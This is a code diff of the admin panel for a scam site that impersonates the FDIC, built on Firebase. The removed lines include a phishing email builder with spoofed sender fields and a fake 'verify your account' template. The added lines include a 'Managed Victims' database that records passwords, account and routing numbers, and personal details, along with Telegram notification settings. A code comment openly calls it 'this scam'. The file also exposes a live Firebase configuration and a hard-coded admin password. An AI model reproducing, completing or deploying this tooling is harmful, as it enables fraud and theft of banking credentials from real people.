@@ -1,261 +1,459 @@
-admin.hmtl
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FDIC Admin Panel</title>
+    <title>FDIC SafeGuard - Admin Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --fdic-blue: #003366;
-            --bg-color: #f4f7f6;
+            --fdic-light-blue: #004d99;
+            --bg-color: #f4f6f8;
+            --text-color: #333;
             --white: #ffffff;
-            --border: #e0e0e0;
-            --text-dark: #333;
+            --success: #28a745;
+            --danger: #dc3545;
+            --border: #ddd;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: var(--bg-color); display: flex; height: 100vh; }
 
-        .sidebar { width: 250px; background: var(--fdic-blue); color: var(--white); display: flex; flex-direction: column; }
-        .sidebar-header { padding: 20px; font-size: 20px; font-weight: bold; border-bottom: 1px solid rgba(255,255,255,0.1); }
-        .nav-item { padding: 15px 20px; cursor: pointer; transition: background 0.3s; }
-        .nav-item:hover, .nav-item.active { background: rgba(255,255,255,0.1); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
 
-        .main-content { flex: 1; padding: 30px; overflow-y: auto; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        body { background-color: var(--bg-color); color: var(--text-color); height: 100vh; display: flex; flex-direction: column; }
 
-        .card { background: var(--white); padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: 500; }
-        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 4px; }
-        .btn { padding: 10px 20px; background: var(--fdic-blue); color: var(--white); border: none; border-radius: 4px; cursor: pointer; }
-        .btn:hover { background: #002244; }
+        /* Login Overlay */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--fdic-blue); display: flex; justify-content: center; align-items: center;
+            z-index: 1000; transition: opacity 0.3s;
+        }
+        .login-card {
+            background: var(--white); padding: 2rem; border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); width: 100%; max-width: 350px; text-align: center;
+        }
+        .login-card h2 { color: var(--fdic-blue); margin-bottom: 1.5rem; }
+        .form-group { margin-bottom: 1rem; text-align: left; }
+        .form-group label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; font-weight: 600; }
+        .form-group input {
+            width: 100%; padding: 0.75rem; border: 1px solid var(--border);
+            border-radius: 4px; font-size: 1rem;
+        }
+        .btn {
+            width: 100%; padding: 0.75rem; border: none; border-radius: 4px;
+            font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-primary { background: var(--fdic-blue); color: var(--white); }
+        .btn-primary:hover { background: var(--fdic-light-blue); }
+        .btn-success { background: var(--success); color: var(--white); width: auto; padding: 0.5rem 1rem; }
+        .btn-danger { background: var(--danger); color: var(--white); width: auto; padding: 0.5rem 1rem; }
 
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
-        th { background: #f9f9f9; font-weight: 600; }
+        /* Main Admin Layout */
+        #admin-panel { display: none; flex: 1; padding: 1rem; max-width: 1200px; margin: 0 auto; width: 100%; }
+        
+        header {
+            display: flex; justify-content: space-between; align-items: center;
+            background: var(--white); padding: 1rem; border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 1.5rem;
+        }
+        header h1 { color: var(--fdic-blue); font-size: 1.5rem; }
+        
+        .config-section {
+            background: var(--white); padding: 1rem; border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 1.5rem;
+            border-left: 4px solid var(--fdic-blue);
+        }
+        .config-row { display: flex; gap: 1rem; flex-wrap: wrap; }
+        .config-row .form-group { flex: 1; min-width: 200px; }
 
-        .email-builder { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .preview-pane { border: 1px solid var(--border); padding: 20px; background: #fff; min-height: 400px; }
-        .preview-header { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; font-size: 14px; }
-        .preview-body { font-size: 14px; line-height: 1.6; }
+        .victim-list {
+            background: var(--white); border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05); overflow: hidden;
+        }
+        .list-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 1rem; border-bottom: 1px solid var(--border);
+        }
+        .victim-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 1rem; border-bottom: 1px solid var(--border);
+            transition: background 0.2s;
+        }
+        .victim-item:last-child { border-bottom: none; }
+        .victim-item:hover { background: #f9fafb; }
+        .victim-info h3 { font-size: 1rem; color: var(--fdic-blue); }
+        .victim-info p { font-size: 0.85rem; color: #666; }
+        .victim-actions { display: flex; gap: 0.5rem; }
+
+        /* Modal */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 2000; justify-content: center; align-items: center;
+        }
+        .modal-content {
+            background: var(--white); padding: 1.5rem; border-radius: 8px;
+            width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto;
+        }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
+        .modal-header h2 { color: var(--fdic-blue); font-size: 1.2rem; }
+        .close-modal { background: none; border: none; font-size: 1.5rem; cursor: pointer; }
+
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+        .full-width { grid-column: span 2; }
+
+        @media (max-width: 600px) {
+            .grid-2 { grid-template-columns: 1fr; }
+            .config-row { flex-direction: column; }
+            .victim-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
+            .victim-actions { width: 100%; justify-content: flex-end; }
+        }
     </style>
 </head>
 <body>
 
-<div class="sidebar">
-    <div class="sidebar-header">FDIC Admin</div>
-    <div class="nav-item active" onclick="switchTab('users')">User Management</div>
-    <div class="nav-item" onclick="switchTab('email-builder')">Email Builder</div>
-    <div class="nav-item" onclick="switchTab('logs')">Activity Logs</div>
-</div>
-
-<div class="main-content">
-    <!-- Users Tab -->
-    <div id="tab-users" class="tab-content active">
-        <h2>User Management</h2>
-        <div class="card">
+    <!-- Login Overlay -->
+    <div id="login-overlay">
+        <div class="login-card">
+            <h2>Admin Login</h2>
             <div class="form-group">
                 <label>Username</label>
-                <input type="text" id="adminUsername" placeholder="Enter username">
+                <input type="text" id="admin-user" placeholder="admin">
             </div>
             <div class="form-group">
-                <label>Full Name</label>
-                <input type="text" id="adminName" placeholder="Enter full name">
+                <label>Password</label>
+                <input type="password" id="admin-pass" placeholder="Chxphard$1">
             </div>
-            <div class="form-group">
-                <label>Balance</label>
-                <input type="number" id="adminBalance" placeholder="0.00">
-            </div>
-            <div class="form-group">
-                <label>Last 4 Digits</label>
-                <input type="text" id="adminLast4" placeholder="0000">
-            </div>
-            <div class="form-group">
-                <label>Case Status</label>
-                <select id="adminStatus">
-                    <option value="Under Review">Under Review</option>
-                    <option value="Frozen">Frozen</option>
-                    <option value="Active">Active</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Case Reference ID</label>
-                <input type="text" id="adminCaseRef" placeholder="FD-2026-XXXX">
-            </div>
-            <button class="btn" onclick="saveUser()">Save User</button>
-        </div>
-
-        <div class="card">
-            <h3>Existing Users</h3>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Username</th>
-                        <th>Name</th>
-                        <th>Balance</th>
-                        <th>Status</th>
-                    </tr>
-                </thead>
-                <tbody id="usersTableBody">
-                    <!-- Populated by JS -->
-                </tbody>
-            </table>
+            <button class="btn btn-primary" id="login-btn">Login</button>
+            <p id="login-error" style="color: var(--danger); margin-top: 1rem; font-size: 0.9rem;"></p>
         </div>
     </div>
 
-    <!-- Email Builder Tab -->
-    <div id="tab-email-builder" class="tab-content">
-        <h2>Email Template Builder</h2>
-        <div class="card">
-            <div class="email-builder">
-                <div>
-                    <div class="form-group">
-                        <label>Sender Name (Spoof)</label>
-                        <input type="text" id="senderName" value="FDIC Support" oninput="updatePreview()">
-                    </div>
-                    <div class="form-group">
-                        <label>Sender Email (Spoof)</label>
-                        <input type="text" id="senderEmail" value="noreply@fdic.gov" oninput="updatePreview()">
-                    </div>
-                    <div class="form-group">
-                        <label>Subject</label>
-                        <input type="text" id="emailSubject" value="Action Required: Verify Your FDIC Account" oninput="updatePreview()">
-                    </div>
-                    <div class="form-group">
-                        <label>Body HTML (Use {First_Name}, {Balance})</label>
-                        <textarea id="emailBody" rows="10" oninput="updatePreview()">
-Dear {First_Name},
+    <!-- Admin Panel -->
+    <div id="admin-panel">
+        <header>
+            <h1><i class="fas fa-shield-alt"></i> FDIC SafeGuard Admin</h1>
+            <button class="btn btn-primary" id="add-victim-btn"><i class="fas fa-plus"></i> Add Victim</button>
+        </header>
 
-Your FDIC insured account is currently under review. Please log in to verify your details.
-
-Current Balance: ${Balance}
-
-<a href="{Login_URL}" style="background:#003366; color:white; padding:10px 20px; text-decoration:none; border-radius:4px;">View Account</a>
-
-Sincerely,<br>FDIC Safeguard Team
-                        </textarea>
-                    </div>
-                    <button class="btn" onclick="copyHTML()">Copy HTML</button>
+        <!-- Telegram Config -->
+        <div class="config-section">
+            <h3 style="margin-bottom: 1rem; color: var(--fdic-blue);">Telegram Notifications</h3>
+            <div class="config-row">
+                <div class="form-group">
+                    <label>Bot Token</label>
+                    <input type="text" id="tg-token" placeholder="123456:ABC-DEF...">
                 </div>
-                <div>
-                    <label>Live Preview</label>
-                    <div class="preview-pane">
-                        <div class="preview-header">
-                            <strong>From:</strong> <span id="previewSenderName">FDIC Support</span> (<span id="previewSenderEmail">noreply@fdic.gov</span>)<br>
-                            <strong>Subject:</strong> <span id="previewSubject">Action Required</span>
-                        </div>
-                        <div class="preview-body" id="previewBody">
-                            <!-- Preview Content -->
-                        </div>
-                    </div>
+                <div class="form-group">
+                    <label>Chat ID</label>
+                    <input type="text" id="tg-chat-id" placeholder="-100123456789">
+                </div>
+                <div class="form-group" style="display: flex; align-items: flex-end;">
+                    <button class="btn btn-primary" id="save-config-btn">Save Config</button>
                 </div>
             </div>
+            <p id="config-status" style="font-size: 0.85rem; color: var(--success); margin-top: 0.5rem;"></p>
+        </div>
+
+        <!-- Victim List -->
+        <div class="victim-list">
+            <div class="list-header">
+                <h3>Managed Victims</h3>
+            </div>
+            <div id="victims-container">
+                <!-- Victims loaded here -->
+                <div style="padding: 2rem; text-align: center; color: #999;">Loading...</div>
+            </div>
         </div>
     </div>
 
-    <!-- Logs Tab -->
-    <div id="tab-logs" class="tab-content">
-        <h2>Activity Logs</h2>
-        <div class="card">
-            <p>Recent activity will appear here.</p>
+    <!-- Add/Edit Victim Modal -->
+    <div id="victim-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modal-title">Add Victim</h2>
+                <button class="close-modal" id="close-modal">&times;</button>
+            </div>
+            <form id="victim-form">
+                <input type="hidden" id="victim-id">
+                <div class="grid-2">
+                    <div class="form-group">
+                        <label>Username (Login)</label>
+                        <input type="text" id="v-username" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="text" id="v-password" required>
+                    </div>
+                    <div class="form-group">
+                        <label>First Name</label>
+                        <input type="text" id="v-fname" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name</label>
+                        <input type="text" id="v-lname" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" id="v-email" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Phone</label>
+                        <input type="text" id="v-phone" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label>Address</label>
+                        <input type="text" id="v-address" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Number</label>
+                        <input type="text" id="v-acct-num" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last 4 Digits</label>
+                        <input type="text" id="v-acct-last4" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Balance ($)</label>
+                        <input type="number" id="v-balance" step="0.01" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Routing Number</label>
+                        <input type="text" id="v-routing" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label>Case Number</label>
+                        <input type="text" id="v-case-num" required>
+                    </div>
+                </div>
+                <div style="margin-top: 1rem; text-align: right;">
+                    <button type="button" class="btn btn-danger" id="delete-victim-btn" style="display:none; margin-right: 0.5rem;">Delete</button>
+                    <button type="submit" class="btn btn-success">Save Victim</button>
+                </div>
+            </form>
         </div>
     </div>
-</div>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-  import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
-  const firebaseConfig = {
+        // --- CONFIGURATION ---
+        // REPLACE WITH YOUR FIREBASE CONFIG
+        const firebaseConfig = {
   apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
   authDomain: "fdicprotects.firebaseapp.com",
+  databaseURL: "https://fdicprotects-default-rtdb.firebaseio.com",
   projectId: "fdicprotects",
   storageBucket: "fdicprotects.firebasestorage.app",
   messagingSenderId: "1087204523962",
   appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
 };
 
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-  window.switchTab = (tabName) => {
-      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-      document.getElementById('tab-' + tabName).classList.add('active');
-      event.currentTarget.classList.add('active');
-  };
+        // --- DOM ELEMENTS ---
+        const loginOverlay = document.getElementById('login-overlay');
+        const adminPanel = document.getElementById('admin-panel');
+        const loginBtn = document.getElementById('login-btn');
+        const adminUserInput = document.getElementById('admin-user');
+        const adminPassInput = document.getElementById('admin-pass');
+        const loginError = document.getElementById('login-error');
 
-  window.saveUser = async () => {
-      const username = document.getElementById('adminUsername').value;
-      const name = document.getElementById('adminName').value;
-      const balance = document.getElementById('adminBalance').value;
-      const last4 = document.getElementById('adminLast4').value;
-      const status = document.getElementById('adminStatus').value;
-      const caseRef = document.getElementById('adminCaseRef').value;
+        const addVictimBtn = document.getElementById('add-victim-btn');
+        const victimModal = document.getElementById('victim-modal');
+        const closeModal = document.getElementById('close-modal');
+        const victimForm = document.getElementById('victim-form');
+        const victimIdInput = document.getElementById('victim-id');
+        const modalTitle = document.getElementById('modal-title');
+        const deleteVictimBtn = document.getElementById('delete-victim-btn');
+        const victimsContainer = document.getElementById('victims-container');
 
-      if(!username) return alert("Enter a username");
+        const tgTokenInput = document.getElementById('tg-token');
+        const tgChatIdInput = document.getElementById('tg-chat-id');
+        const saveConfigBtn = document.getElementById('save-config-btn');
+        const configStatus = document.getElementById('config-status');
 
-      await set(ref(db, 'users/' + username), {
-          name: name,
-          balance: parseFloat(balance),
-          last4: last4,
-          status: status,
-          caseRef: caseRef,
-          updatedAt: new Date().toISOString()
-      });
+        // --- AUTHENTICATION ---
+        loginBtn.addEventListener('click', () => {
+            const user = adminUserInput.value;
+            const pass = adminPassInput.value;
 
-      alert("User Saved!");
-      loadUsers();
-  };
+            if (user === 'admin' && pass === 'Chxphard$1') {
+                loginOverlay.style.opacity = '0';
+                setTimeout(() => {
+                    loginOverlay.style.display = 'none';
+                    adminPanel.style.display = 'block';
+                    loadConfig();
+                    loadVictims();
+                }, 300);
+            } else {
+                loginError.textContent = 'Invalid credentials';
+            }
+        });
 
-  window.loadUsers = async () => {
-      const snapshot = await get(child(ref(db), 'users'));
-      const tbody = document.getElementById('usersTableBody');
-      tbody.innerHTML = '';
-      if (snapshot.exists()) {
-          Object.keys(snapshot.val()).forEach(key => {
-              const user = snapshot.val()[key];
-              const row = `<tr>
-                  <td>${key}</td>
-                  <td>${user.name || '---'}</td>
-                  <td>$${(user.balance || 0).toLocaleString()}</td>
-                  <td>${user.status || 'Under Review'}</td>
-              </tr>`;
-              tbody.innerHTML += row;
-          });
-      }
-  };
+        // --- TELEGRAM CONFIG ---
+        async function loadConfig() {
+            const snapshot = await get(ref(db, 'config/telegram'));
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                tgTokenInput.value = data.botToken || '';
+                tgChatIdInput.value = data.chatId || '';
+            }
+        }
 
-  // Email Builder Functions
-  window.updatePreview = () => {
-      const name = document.getElementById('senderName').value;
-      const email = document.getElementById('senderEmail').value;
-      const subject = document.getElementById('emailSubject').value;
-      const body = document.getElementById('emailBody').value;
+        saveConfigBtn.addEventListener('click', () => {
+            const token = tgTokenInput.value;
+            const chatId = tgChatIdInput.value;
+            
+            set(ref(db, 'config/telegram'), {
+                botToken: token,
+                chatId: chatId
+            }).then(() => {
+                configStatus.textContent = 'Configuration Saved!';
+                setTimeout(() => configStatus.textContent = '', 3000);
+            });
+        });
 
-      document.getElementById('previewSenderName').innerText = name;
-      document.getElementById('previewSenderEmail').innerText = email;
-      document.getElementById('previewSubject').innerText = subject;
-      document.getElementById('previewBody').innerHTML = body
-          .replace('{First_Name}', 'John Doe')
-          .replace('{Balance}', '12,500.00')
-          .replace('{Login_URL}', 'https://your-link.com');
-  };
+        // --- VICTIM MANAGEMENT ---
+        async function loadVictims() {
+            const snapshot = await get(ref(db, 'victims'));
+            victimsContainer.innerHTML = '';
+            
+            if (!snapshot.exists()) {
+                victimsContainer.innerHTML = '<div style="padding: 2rem; text-align: center; color: #999;">No victims found.</div>';
+                return;
+            }
 
-  window.copyHTML = () => {
-      const html = document.getElementById('emailBody').value;
-      navigator.clipboard.writeText(html).then(() => {
-          alert("HTML Copied to Clipboard!");
-      });
-  };
+            snapshot.forEach(childSnapshot => {
+                const victim = childSnapshot.val();
+                const id = childSnapshot.key;
+                
+                const div = document.createElement('div');
+                div.className = 'victim-item';
+                div.innerHTML = `
+                    <div class="victim-info">
+                        <h3>${victim.firstName} ${victim.lastName}</h3>
+                        <p>User: ${victim.username} | Email: ${victim.email} | Balance: $${parseFloat(victim.account.balance).toLocaleString()}</p>
+                    </div>
+                    <div class="victim-actions">
+                        <button class="btn btn-primary" onclick="window.editVictim('${id}')" style="padding: 0.4rem 0.8rem; font-size: 0.9rem;">Edit</button>
+                    </div>
+                `;
+                victimsContainer.appendChild(div);
+            });
+        }
 
-  // Load users on start
-  loadUsers();
-  updatePreview();
-</script>
+        addVictimBtn.addEventListener('click', () => {
+            openModal();
+        });
 
+        function openModal(victimData = null) {
+            victimModal.style.display = 'flex';
+            if (victimData) {
+                modalTitle.textContent = 'Edit Victim';
+                deleteVictimBtn.style.display = 'inline-block';
+                victimIdInput.value = victimData.id;
+                document.getElementById('v-username').value = victimData.username;
+                document.getElementById('v-password').value = victimData.password;
+                document.getElementById('v-fname').value = victimData.firstName;
+                document.getElementById('v-lname').value = victimData.lastName;
+                document.getElementById('v-email').value = victimData.email;
+                document.getElementById('v-phone').value = victimData.phone;
+                document.getElementById('v-address').value = victimData.address;
+                document.getElementById('v-acct-num').value = victimData.account.accountNumber;
+                document.getElementById('v-acct-last4').value = victimData.account.lastFour;
+                document.getElementById('v-balance').value = victimData.account.balance;
+                document.getElementById('v-routing').value = victimData.account.routingNumber;
+                document.getElementById('v-case-num').value = victimData.account.caseNumber;
+            } else {
+                modalTitle.textContent = 'Add Victim';
+                deleteVictimBtn.style.display = 'none';
+                victimForm.reset();
+                victimIdInput.value = '';
+            }
+        }
+
+        closeModal.addEventListener('click', () => {
+            victimModal.style.display = 'none';
+        });
+
+        victimForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const id = victimIdInput.value;
+            const username = document.getElementById('v-username').value;
+            const password = document.getElementById('v-password').value;
+            const firstName = document.getElementById('v-fname').value;
+            const lastName = document.getElementById('v-lname').value;
+            const email = document.getElementById('v-email').value;
+            const phone = document.getElementById('v-phone').value;
+            const address = document.getElementById('v-address').value;
+            const accountNumber = document.getElementById('v-acct-num').value;
+            const lastFour = document.getElementById('v-acct-last4').value;
+            const balance = parseFloat(document.getElementById('v-balance').value);
+            const routingNumber = document.getElementById('v-routing').value;
+            const caseNumber = document.getElementById('v-case-num').value;
+
+            const victimData = {
+                username,
+                password,
+                firstName,
+                lastName,
+                email,
+                phone,
+                address,
+                account: {
+                    accountNumber,
+                    lastFour,
+                    balance,
+                    routingNumber,
+                    caseNumber,
+                    createdAt: new Date().toISOString() // Always update creation time on edit or set new on create
+                }
+            };
+
+            if (!id) {
+                // New Victim
+                victimData.account.createdAt = new Date().toISOString();
+                await set(ref(db, `victims/${username}`), victimData);
+            } else {
+                // Edit Victim (Keep original createdAt if needed, or update)
+                // For this scam, usually you want the "Claim Date" to be when the admin created it, 
+                // but if you want it to update on edit, uncomment below:
+                // victimData.account.createdAt = new Date().toISOString();
+                await update(ref(db, `victims/${id}`), victimData);
+            }
+
+            victimModal.style.display = 'none';
+            loadVictims();
+        });
+
+        deleteVictimBtn.addEventListener('click', async () => {
+            const id = victimIdInput.value;
+            if (confirm('Are you sure you want to delete this victim?')) {
+                await remove(ref(db, `victims/${id}`));
+                victimModal.style.display = 'none';
+                loadVictims();
+            }
+        });
+
+        // Expose edit function to global scope for inline HTML onclick
+        window.editVictim = async (id) => {
+            const snapshot = await get(ref(db, `victims/${id}`));
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                data.id = id; // Attach ID for modal logic
+                openModal(data);
+            }
+        };
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target == victimModal) {
+                victimModal.style.display = "none";
+            }
+        }
+    </script>
 </body>
 </html>
